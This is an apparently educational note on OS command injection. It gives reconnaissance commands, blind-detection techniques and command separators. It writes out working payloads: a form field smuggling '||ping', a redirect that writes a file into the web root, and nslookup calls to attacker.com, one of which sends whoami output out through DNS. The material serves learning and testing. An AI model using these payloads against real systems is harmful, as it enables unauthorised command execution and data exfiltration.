Command injection is a type of vulnerability which occurs when user supplied input which has not been handled correctly is included in commands run on the system. Allowing the user to execute arbitrary shell commands on the server. Using payloads such as `&` symbols and `|` symbols. Some useful commands which if injected can be a security risk are,

| Purpose of Command    | Linux            | Windows         |
| --------------------- | ---------------- | --------------- |
| Name of current user  | `whoami`         | `whoami`        |
| Operating System      | `uname -a`       | `ver`           |
| Network configuration | `ifconfig`       | `ipconfig \all` |
| Network connections   | `netstat -an`    | `netstat -an`   |
| Running Processes     | `ps -ef/ps -aux` | `tasklist`      |
### Blind OS command injection vulnerabilities
Blind OS command injection vulnerabilities exist when the commands ran don't return anything or the returned output is not displayed on the site. In this case one can use various methods to verify if a command injection vulnerability exists.

__Using Time Delays__
Being able to use `ping` with a command injection can help verify if the command goes through since doing something like `ping -c 10 127.0.0.1` can induce a time delay, letting us verify the existence of the injection, payloads such as the following may be used.
```
&email=x||ping+-c+10+127.0.0.1||
```

__Using Output Redirection__
If one is somehow able to redirect output to files the server serves, then a injected command could redirect output to create a file, the existence of the file would verify the presence of command injection issues. Something like the following command
```
$ whoami > /var/www/images/pwned.txt
```

__Using Out-of-band(OAST) Techniques__
If one can inject a command which request's or pings a attack controlled server, the attacker can check for requests to the server to verify the existence of a vulnerability, something like the following might work
```
& nslook attacker.com &
```

One could also exfiltrate data using such techniques using commands as follows
```
& nslookup `whoami`.attacker.com &
```

### Ways of injecting OS commands
Various separators exist on both linux and windows and can be used to chain commands together, some of them which work on both operating systems are 
```
&, &&, |, ||
```
The following separators work only on Unix based systems
```
;, newlines(\n, 0x0a)
```

Also using back-ticks or or dollar characters allows attackers to do inline command execution on linux
```
` injected command `
$(injected command)
```
